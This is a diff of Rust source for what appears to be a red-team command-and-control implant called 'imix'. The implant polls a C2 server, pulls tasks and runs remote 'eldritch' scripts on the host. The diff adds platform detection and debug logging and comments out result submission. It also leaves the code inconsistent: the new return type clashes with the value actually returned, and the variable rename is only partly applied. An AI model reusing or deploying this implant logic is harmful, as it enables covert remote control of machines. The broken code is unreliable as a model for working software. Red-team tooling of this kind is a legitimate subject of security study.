@@ -46,7 +46,7 @@ async fn handle_exec_tome(task: GraphQLTask, print_channel_sender: Sender<String
     let print_handler = EldritchPrintHandler{ sender: print_channel_sender };
 
     // Execute a tome script
-    let res =  match thread::spawn(move || { eldritch_run(tome_name, tome_contents, task_job.tome.parameters, &print_handler) }).join() {
+    let res =  match thread::spawn(move || { eldritch_run(tome_name, tome_contents, task_job.parameters, &print_handler) }).join() {
         Ok(local_thread_res) => local_thread_res,
         Err(_) => todo!(),
     };
@@ -57,7 +57,7 @@ async fn handle_exec_tome(task: GraphQLTask, print_channel_sender: Sender<String
     }
 }
 
-async fn handle_exec_timeout_and_response(imix_callback_uri: String, task: graphql::GraphQLTask, print_channel_sender: Sender<String>) -> Result<(), Error> {
+async fn handle_exec_timeout_and_response(imix_callback_uri: String, task: graphql::GraphQLTask, print_channel_sender: Sender<String>) -> Result<(String, String), Error> {
     let start_time = Utc::now();
 
     // Tasks will be forcebly stopped after 1 week.
@@ -67,7 +67,7 @@ async fn handle_exec_timeout_and_response(imix_callback_uri: String, task: graph
     let exec_future = handle_exec_tome(task.clone(), print_channel_sender);
 
     // Execute that future with a timeout defined by the timeout argument.
-    let tome_output = match tokio::time::timeout(timeout_duration, exec_future).await {
+    let tome_result = match tokio::time::timeout(timeout_duration, exec_future).await {
         Ok(res) => {
             match res {
                 Ok(tome_result) => tome_result,
@@ -77,20 +77,21 @@ async fn handle_exec_timeout_and_response(imix_callback_uri: String, task: graph
         Err(timer_elapsed) => ("".to_string(), format!("Time elapsed task {} has been running for {} seconds", task.id, timer_elapsed.to_string())),
     };
 
-    // Send task response
-    let task_response = graphql::GraphQLSubmitTaskResultInput {
-        task_id: task.id.clone(),
-        exec_started_at: start_time,
-        exec_finished_at: Some(Utc::now()),
-        output: tome_output.0.clone(),
-        error: tome_output.1.clone(),
-    };
+    // // Send task response
+    // let task_response = graphql::GraphQLSubmitTaskResultInput {
+    //     task_id: task.id.clone(),
+    //     exec_started_at: start_time,
+    //     exec_finished_at: Some(Utc::now()),
+    //     output: tome_output.0.clone(),
+    //     error: tome_output.1.clone(),
+    // };
 
-    let submit_task_result = graphql::gql_post_task_result(imix_callback_uri, task_response).await;
-    match submit_task_result {
-        Ok(_) => Ok(()), // Currently no reason to save the task since it's the task we just answered.
-        Err(error) => Err(error),
-    }
+    // let submit_task_result = graphql::gql_post_task_result(imix_callback_uri, task_response).await;
+    // match submit_task_result {
+    //     Ok(_) => Ok(()), // Currently no reason to save the task since it's the task we just answered.
+    //     Err(error) => Err(error),
+    // }
+    Ok(())
 }
 
 fn get_principal() -> Result<String> {
@@ -142,6 +143,18 @@ fn get_primary_ip() -> Result<String> {
         },
     };
     Ok(res)
+}
+
+fn get_host_platform() -> Result<String> {
+    if cfg!(target_os = "linux") {
+        return Ok("Linux".to_string());
+    } else if cfg!(target_os = "windows") {
+        return Ok("Windows".to_string());
+    } else if cfg!(target_os = "macos") {
+        return Ok("MacOS".to_string());
+    } else {
+        return Ok("Unknown".to_string());
+    }
 }
 
 fn get_os_pretty_name() -> Result<String> {
@@ -199,6 +212,16 @@ async fn main_loop(config_path: String) -> Result<()> {
         },
     };
 
+    let host_platform = match get_host_platform() {
+        Ok(tmp_host_platform) => tmp_host_platform,
+        Err(error) => {
+            if debug {
+                return Err(anyhow::anyhow!("Unable to get host platform id\n{}", error));
+            }
+            "Unknown".to_string()
+        },
+    };
+
     let host_id = match get_host_id("/etc/system-id".to_string()) {
         Ok(tmp_host_id) => tmp_host_id,
         Err(error) => {
@@ -215,12 +238,13 @@ async fn main_loop(config_path: String) -> Result<()> {
         session_identifier: session_id,
         host_identifier: host_id,
         agent_identifier: format!("{}-{}","imix",version_string),
+        host_platform: host_platform,
     };
 
     loop {
         // 0. Get loop start time
         let loop_start_time = Instant::now();
-
+        if debug { println!("Get new tasks"); }
         // 1. Pull down new tasks
         // 1a) calculate callback uri
         let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();
@@ -237,8 +261,11 @@ async fn main_loop(config_path: String) -> Result<()> {
             },
         };
 
+        if debug { println!("Starting {} new tasks", new_tasks.len()); }
         // 2. Start new tasks
         for task in new_tasks {
+            if debug { println!("Launching:\n{:?}", task.clone().job.unwrap().tome.eldritch); }
+
             let (sender, receiver) = channel::<String>();
             let exec_with_timeout = handle_exec_timeout_and_response(cur_callback_uri.clone(), task.clone(), sender.clone());
             match all_exec_futures.insert(task.clone().id, (task::spawn(exec_with_timeout), receiver)) {
@@ -251,7 +278,7 @@ async fn main_loop(config_path: String) -> Result<()> {
             }
         }
 
-
+        if debug { println!("Sleeping"); }
         // 3. Sleep till callback time
         //                                  time_to_wait          -         time_elapsed
         let time_to_sleep = imix_config.callback_config.interval - loop_start_time.elapsed().as_secs() ;
@@ -261,6 +288,7 @@ async fn main_loop(config_path: String) -> Result<()> {
         // :clap: :clap: make new map!
         let mut running_exec_futures: HashMap<String, (_, _)> = HashMap::new();
 
+        if debug { println!("Checking status"); }
         // Check status
         for exec_future in all_exec_futures.into_iter() {
             if debug {
